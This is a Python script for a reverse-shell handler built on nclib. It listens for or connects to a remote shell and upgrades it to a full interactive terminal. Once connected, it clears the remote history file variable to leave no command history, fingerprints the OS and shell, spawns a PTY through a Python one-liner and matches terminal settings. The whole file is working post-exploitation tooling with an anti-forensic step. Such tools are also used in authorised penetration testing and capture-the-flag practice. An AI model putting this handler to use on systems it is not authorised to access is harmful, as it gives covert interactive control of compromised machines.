#!/usr/bin/env python3
import nclib
import argparse
import termios
import tty
import sys
import signal
from fcntl import ioctl
from struct import unpack
from copy import deepcopy
from os import system, environ
from uuid import uuid4

def resize_term(signum, frame):
	pass

def handle_args():
	parser = argparse.ArgumentParser(description='Like a netcat shell, but magic')
	parser.add_argument('-v', '--verbose', action='store_true')
	parser.add_argument('-u', '--udp', action='store_true')
	subparsers = parser.add_subparsers()

	listen_parser = subparsers.add_parser('l', help="Listen for incoming shell")
	listen_parser.add_argument('port', type=int)
	listen_parser.set_defaults(action=listen)

	connect_parser = subparsers.add_parser('c', help="Connect to shell")
	connect_parser.add_argument('host')
	connect_parser.add_argument('port', type=int)
	connect_parser.set_defaults(action=connect)

	return parser.parse_args()

def remote_command(command, server, timeout=2, prompt=None):
	_ = server.send_line(str.encode(command))
	if (prompt):
		output = server.recv_until(str.encode(prompt))
	else:
		output = server.recv(timeout=timeout)
		if (str(output, 'ascii').strip().endswith(command.strip())):
			output = server.recv(timeout=timeout)
	return bytes.decode(output, 'ascii')

def spawn_tty(server, shell):
	#TODO: other methods of tty spawning
	python_bin = remote_command('which python2 || which python || which python3', server).strip()
	if python_bin:
		print(f"Python found at {python_bin}")
	else:
		exit("Could not find python to spawn tty")
	# The "exit" ensures that netcat/sh actually F#%&ing dies
	prompt = remote_command(f'export SHELL={shell} TERM=;{python_bin} -c \'import pty;pty.spawn("{shell}")\' 2>/dev/null ; exit',server, 2).strip('\r\n')
	return prompt

def set_prompt(server, shell):
	pass

def listen(args):
	nc = nclib.Netcat(listen=('localhost', args.port), udp=args.udp, verbose=args.verbose)
	return nc

def connect(args):
	nc = nclib.Netcat(connect=(args.host, args.port), udp=args.udp, verbose=args.verbose)
	return nc

def check_term():
	term = environ['TERM'].lower()
	# TODO: other terminal support
	if term[:5] != "xterm":
		exit("Only X terminals are supported at this time")
	color = "color" in term
	return term, color
	
def set_term(term, server, prompt):
	fallback = ['dumb','xterm', term]
	reset_result = remote_command('reset', server)
	remote_term = term
	while reset_result[-15:] == "Terminal type? ":
		if not len(fallback):
			exit("No fallback terminals supported by the system")
		remote_term = fallback.pop()
		reset_result = remote_command(remote_term, server)
	_ = server.recv_until(str.encode(prompt))
	_ = remote_command(f'export TERM="{remote_term}"', server, prompt=prompt)
	return remote_term
		
def set_termios(local_termios, term, prompt, connection):
	local_termios[3] = local_termios[3] & ~termios.ECHO
	termios.tcsetattr(sys.stdin, termios.TCSAFLUSH ,local_termios)
	remote_term = set_term(term, connection, prompt)

	#ioctl TIOCGWINSZ returns a struct containing the rows and cols
	rows, cols = unpack('hh', ioctl(sys.stdin, termios.TIOCGWINSZ, '1234'))
	# TODO: hook for terminal resize
	# TODO: what if stty isn't available
	_ = remote_command(f'stty rows {rows} cols {cols}', connection, prompt=prompt)
	tty.setraw(sys.stdin)
	return remote_term

def main():
	args = handle_args()
	print("Awaiting connection...")
	nc = args.action(args)
	print("Connected!")
	#make sure to not record history
	_ = remote_command(' export HISTFILE=', nc, 0)
	#detect OS
	os = remote_command('uname -s', nc).strip()
	# TODO: handle other OSs
	if os not in ['Linux', 'FreeBSD', 'Darwin', 'NetBSD']:
		exit(f'The following operating system is not supported: {os}')
	#detect shell TODO: warn for unsupported shell
	shell = remote_command('which $0', nc).strip()
	# TODO: probe remote for accepted terminals
	# TODO: check if a tty is already available
	local_term, color = check_term()
	if not shell:
		shell = '/bin/sh'
	# TODO: customise prompt
	prompt = spawn_tty(nc, shell)
	local_termios = termios.tcgetattr(sys.stdin)
	try:
		remote_term = set_termios(deepcopy(local_termios), local_term, prompt, nc)
		print(f"OS: {os} | Shell: {shell} | Term: {remote_term}", end="\r\n")
		# FIXME: hack to get a working prompt
		print(prompt, end='', flush=True)
		nc.interact()
	except Exception as e:
		print(e)
	finally:
		#reset terminal
		termios.tcsetattr(sys.stdin, termios.TCSANOW, local_termios)
		return
		# TODO: print status code

if __name__ == "__main__":
	main()